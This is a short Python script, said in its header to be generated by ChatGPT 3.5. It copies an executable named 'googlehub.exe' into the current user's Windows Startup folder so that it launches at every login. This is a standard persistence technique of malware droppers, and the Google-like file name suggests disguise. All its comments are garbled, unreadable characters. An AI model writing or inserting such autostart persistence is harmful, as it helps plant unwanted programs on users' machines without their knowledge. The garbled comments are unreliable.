# created by chatgpt 3.5, because i lazy create somethimg in python
import shutil
import os

# �������� ������� ����������
current_directory = os.getcwd()

# ��� �����, ������� �� ������ �����������
file_name = 'googlehub.exe'

# ������ ���� � �����
source_path = os.path.join(current_directory, file_name)

# ����, ���� �� ������ ����������� ����
destination_path = os.path.join('C:\\Users', os.getenv('USERNAME'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.copy(source_path, os.path.join(destination_path, file_name))

